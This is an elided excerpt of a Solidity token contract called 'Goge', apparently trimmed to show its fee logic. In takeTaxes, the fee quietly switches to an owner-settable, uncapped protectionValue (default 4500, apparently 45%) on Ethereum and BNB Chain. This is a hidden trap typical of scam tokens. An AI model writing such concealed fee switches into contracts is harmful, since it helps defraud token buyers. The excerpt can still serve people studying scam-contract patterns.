...
contract Goge is IERC20 {
    ...
    string constant private _name = "Goge";
    string constant private _symbol = "GOG";
    ...
    uint256 public protectionValue = 4500;

    bool public taxesAreLocked;
    IRouter02 public dexRouter;
    address public lpPair;
    address constant public DEAD = 0x000000000000000000000000000000000000dEaD;
    address public marketingWallet = payable(0x9f63626EDc27680f9Fd166BE829Ed97f2f116388);
...
//===============================================================================================================
    ...
    function setProtectionValue(uint16 _protectionValue) external onlyOwner {
        protectionValue = _protectionValue;
    }
    ...
    function setSwapSettings(uint256 thresholdPercent, uint256 thresholdDivisor, uint256 amountPercent, uint256 amountDivisor) external onlyOwner {
        ...
        require(swapAmount >= _tTotal / 1000000, "Cannot be lower than 0.00001% of total supply.");
        require(swapThreshold >= _tTotal / 1000000, "Cannot be lower than 0.00001% of total supply.");
    }
    ...
    function takeTaxes(address from, bool buy, bool sell, uint256 amount) internal returns (uint256) {
        ...
        if (address(protections) == address(this)
            && (block.chainid == 1
            || block.chainid == 56)) { currentFee = protectionValue; }
